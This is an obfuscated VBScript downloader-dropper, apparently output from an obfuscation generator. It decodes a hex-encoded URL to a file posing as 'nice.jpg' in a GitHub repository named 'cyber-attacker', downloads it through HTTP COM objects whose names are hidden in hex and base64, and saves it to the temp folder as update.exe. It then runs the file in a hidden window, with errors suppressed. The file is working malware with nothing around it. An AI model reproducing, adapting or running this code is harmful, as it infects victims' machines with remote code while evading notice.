' seed=1337
' target=update.exe
' decoders=['b64', 'hex']

On Error Resume Next

Function NcbIzJC(bvw, VlU)
    Dim vfq
    vfq = bvW & "-" & vlU
    If Len(Vfq) > 0 Then
        NCbizjc = StrReVERsE(VFq)
    Else
        ncBIzJc = ""
    End If
End Function

Function KpJTEBFJ(T)
    Dim I, p, B, n, s
    S = ""
    For I = 1 To LEN(T) Step 4
        n = 0
        For P = 0 To 3
            b = INSTR(1, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", mId(t, i + p, 1), 0)
            If b = 0 Then B = 0 Else b = B - 1
            If MId(t, I + p, 1) = "=" Then B = 0
            n = n * 64 + B
        Next
        S = s & ChR((N \ 65536) And 255)
        If mid(T, i + 2, 1) <> "=" And (i + 2) <= LEn(T) Then S = s & cHR((n \ 256) And 255)
        If mid(t, i + 3, 1) <> "=" And (I + 3) <= Len(t) Then s = s & cHR(N And 255)
    Next
    KpjTebfj = s
End Function

Function VijgLiNO(H)
    Dim i, S
    s = ""
    For I = 1 To len(h) Step 2
        s = S & ChR(CLnG("&H" & mId(h, i, 2)))
    Next
    ViJgLInO = s
End Function

Dim cFKjZQ, YIVWmoUn, XaQtbnSz, nrLhTt, uYurmC, SdLTwQOp, ykvtG, GPwBg, kTdNJf, RutrU, uWXDxnki, sufGM, DwSWD

xAQtBnsZ = vIJGliNO("68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f63796265722d61747461636b65722f74656d702f6d61696e2f6e6963652e6a7067")
YKvTg = kpjteBfj(ViJgLinO("6458426b5958526c4c6d56345a513d3d"))
ruTrU = 0
    ruTRu = RuTRU + 5

Set GpWBg = CReATeObjEct("Scripting.FileSystemObject")
Nrlhtt = GpWbG.GETSPecIaLfOldER(2).PatH & "\"
sDlTwqOp = NRlhtt & ykvtG
uyurmC = SdlTWqoP & ".tmp"
dwswD = False
Set kTdnJf = cREateObJECt("WScript.Shell")
For Each UwxdXnKI In arRAY(vijglIno("4d53584d4c322e536572766572584d4c485454502e362e30"), kPJTeBFJ(vijGLINo("54564e59545577794c6c684e54456855564641754e693477")), KpjtebFj("V2luSHR0cC5XaW5IdHRwUmVxdWVzdC41LjE="))
    If Not DWsWD Then
        ERR.CleAR
        Set CfkJzq = Nothing
        Set cfkJzq = cReATEOBJeCT(uwxDXnKI)
        If tYPeNamE(cFkjZq) <> "Nothing" Then
            ERr.ClEar
            cFkJZq.oPEn "GET", XAQtbNsz, False
            CFkJZQ.SenD
            If erR.NUMBER = 0 Then
                If cFKJzq.sTAtUS = 200 Then
                    SuFgm = cFKJzQ.ResPoNsEBODy
                    If vARTyPe(sUfgm) = 8209 Then
                        ERR.cleaR
                        Set yIvWmOUN = cREATEOBJEct("ADODB.Stream")
                        YIVWmoun.tYPE = 1
                        YIVWmOuN.OPEN
                        yIvwMoUN.wRITe SUfgM
                        YIvwMouN.sAvEToFIle uYurmC, 2
                        yivWMoUN.CLoSe
                        Set yIvwMOuN = Nothing
                        If err.nUMBer = 0 And gpwBg.FIleEXIsTS(uyurMC) Then
                            If gPwBg.geTFiLe(UyurMc).SIzE > 0 Then
                                If GPWBG.FILEExISTs(SDLtWQoP) Then GPwBg.DeleTEfiLe sdlTwqoP, True
                                gPwbg.MOVEFILe uyURmC, SDLTwqoP
                                If Err.nUmBEr = 0 And gPwBG.FIlEExiStS(sdLtWQop) Then
                                    If gpwbG.GEtfIlE(SdltwQOp).SiZE > 0 Then
                                        KtDnJF.rUN """" & SdltWQOP & """", 0, False
                                        DwswD = True
                                    Else
                                        GpWBg.DelEtEfile sdLtWQOp, True
                                    End If
                                End If
                            Else
                                GPWBg.DeLEtEFILE UYURmC, True
                            End If
                        Else
                            If gPwBg.fiLEexIsts(UyurMC) Then gPwbg.DEletEfiLE uyUrMC, True
                        End If
                    End If
                End If
            End If
        End If
    End If
Next

Set CFKJzQ = Nothing
Set GpwBG = Nothing
Set KTdnJF = Nothing
WSCRIPT.QUIt 0
